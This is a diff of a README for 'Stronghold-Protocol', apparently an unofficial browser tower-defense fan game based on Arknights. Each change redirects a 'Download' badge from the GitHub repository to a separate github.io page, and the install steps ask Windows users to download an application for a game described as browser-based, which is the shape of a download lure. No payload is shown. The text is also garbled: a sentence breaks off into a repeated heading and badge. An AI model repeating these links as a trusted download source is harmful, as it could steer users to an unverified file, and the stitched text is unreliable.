@@ -1,10 +1,10 @@
 # 🛡️ Stronghold-Protocol - Browser Tower Defense With Friends
 
-[![Download Stronghold-Protocol](https://img.shields.io/badge/Download_Stronghold--Protocol-Visit_Link-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kunal4040/Stronghold-Protocol)
+[![Download Stronghold-Protocol](https://img.shields.io/badge/Download_Stronghold--Protocol-Visit_Link-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://kunal4040.github.io)
 
 Stronghold-Protocol is an unofficial fan# 🛡️ Stronghold-Protocol - Browser Tower Defense With Friends
 
-[![Download Stronghold-Protocol](https://img.shields.io/badge/Download_Stronghold--Protocol-Visit_Link-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kunal4040/Stronghold-Protocol)
+[![Download Stronghold-Protocol](https://img.shields.io/badge/Download_Stronghold--Protocol-Visit_Link-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://kunal4040.github.io)
 
 Stronghold-Protocol is an unofficial, non-commercial fan re-creation of the "Stronghold Protocol: Covenant" mode from Arknights. It is a browser-based auto-battler tower defense game where you place units, watch them fight automatically, and team up with up to three friends over the internet. Everything runs in your web browser, so there is nothing complicated to set up — and this guide walks you through it one step at a time, even if you have never installed anything from GitHub before.
 
@@ -35,7 +35,7 @@ Getting the game onto your Windows computer takes only a few minutes. Follow the
 
 1. **Open the download page.** Click the large button below, or the badge at the very top of this page. Both take you to the same place.
 
-   [![Download Stronghold-Protocol](https://img.shields.io/badge/Get_Stronghold--Protocol-Visit_Link-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kunal4040/Stronghold-Protocol)
+   [![Download Stronghold-Protocol](https://img.shields.io/badge/Get_Stronghold--Protocol-Visit_Link-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://kunal4040.github.io)
 
    Visit this link to download the application.
 
